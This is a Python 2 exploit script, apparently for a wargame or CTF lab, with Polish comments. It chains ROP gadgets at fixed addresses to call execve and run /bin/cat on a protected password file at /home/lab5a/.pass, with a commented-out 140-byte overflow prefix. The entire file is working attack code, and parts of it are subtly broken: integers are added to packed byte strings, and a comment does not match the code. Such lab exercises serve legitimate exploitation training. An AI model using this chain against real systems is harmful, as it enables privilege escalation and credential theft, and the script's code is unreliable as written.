from struct import pack

XOR_EAX_EAX = pack('<I', 0x080544e0)
POP_EAX = pack('<I', 0x080bbf26)
POP_EBX = pack('<I', 0x080481c9)
POP_ECX = pack('<I', 0x080e55ad)
POP_EDX = pack('<I', 0x0806ec5a)
EAX_ADD_3 = pack('<I', 0x0808fd50)
EAX_ADD_2 = pack('<I', 0x0808fd37)
INT = pack('<I', 0x08049401)
DATA_ADDR = pack('<I', 0x080eb060)
MOV_EDX_EAX = pack('<I', 0x0809a95d)
PADDING = pack('<I', 0x41414141)

p = ''

# /hom
# e/la
# b5a/
# .pas
# s000

p += POP_EDX  # pop edx ; ret
p += DATA_ADDR  # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
# ------------- Sciagniecie @ .data do EDX
p += POP_EAX  # pop eax ; ret
p += '/bin'
# ------------- Sciagniecie /bin do EAX
p += MOV_EDX_EAX  # mov dword ptr [edx], eax ; ret
# ------------- Wpisanie pod adres w EDX zawartosci (wskaznika) w EAX
p += POP_EDX  # pop edx ; ret
p += DATA_ADDR + 4  # @ .data + 4
# ------------- Sciagniecie @ .data + 4  do EDX
p += POP_EAX  # pop eax ; ret
p += '/cat'
# ------------- Sciagniecie @ //sh do EAX
p += MOV_EDX_EAX  # mov dword ptr [edx], eax ; ret
# ------------- Wpisanie pod adres w EDX zawartosci (wskaznika) w EA
p += POP_EDX  # pop edx ; ret
p += DATA_ADDR + 8 # @ .data + 8
# ------------- Sciagniecie @ .data + 8  do EDX
p += XOR_EAX_EAX  # xor eax, eax ; ret
p += MOV_EDX_EAX  # mov dword ptr [edx], eax ; ret
# ------------- Wpisanie pod adres w EDX zawartosci (wskaznika) w EAX - w tym wypadku nulla jako zakonczenie stringa

p += POP_EDX
p += DATA_ADDR + 9
p += POP_EAX
p += '/hom'
p += MOV_EDX_EAX

p += POP_EDX
p += DATA_ADDR + 13
p += POP_EAX
p += 'e/la'
p += MOV_EDX_EAX

p += POP_EDX  # pop edx ; ret
p += DATA_ADDR + 17 # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
p += POP_EAX
p += 'b5a/'
p += MOV_EDX_EAX

p += POP_EDX  # pop edx ; ret
p += DATA_ADDR + 21 # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
p += POP_EAX
p += '.pas'
p += MOV_EDX_EAX

p += POP_EDX  # pop edx ; ret
p += DATA_ADDR + 24 # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
p += POP_EAX
p += 's'
p += MOV_EDX_EAX

p += POP_EDX
p += DATA_ADDR + 25
p += POP_EAX
p += XOR_EAX_EAX
p += MOV_EDX_EAX

p += POP_EDX
p += DATA_ADDR + 60
p += POP_EAX
p += DATA_ADDR
p += MOV_EDX_EAX

p += POP_EDX
p += DATA_ADDR + 64
p += POP_EAX
p += DATA_ADDR + 9
p += MOV_EDX_EAX

p += POP_EDX
p += DATA_ADDR + 68
p += POP_EAX
p += XOR_EAX_EAX
p += MOV_EDX_EAX

p += POP_EBX
p += DATA_ADDR

p += POP_ECX
p += DATA_ADDR + 60

p += POP_EDX
p += DATA_ADDR + 48

p += XOR_EAX_EAX  # xor eax, eax ; ret
p += EAX_ADD_3  # add eax, 3 ; ret
p += EAX_ADD_3  # add eax, 3 ; ret
p += EAX_ADD_3  # add eax, 3 ; ret
p += EAX_ADD_2  # add eax, 2 ; ret

p += INT  # int 0x80

print len(p)

# full_payload = 'A' * 140 + p
#
# print full_payload
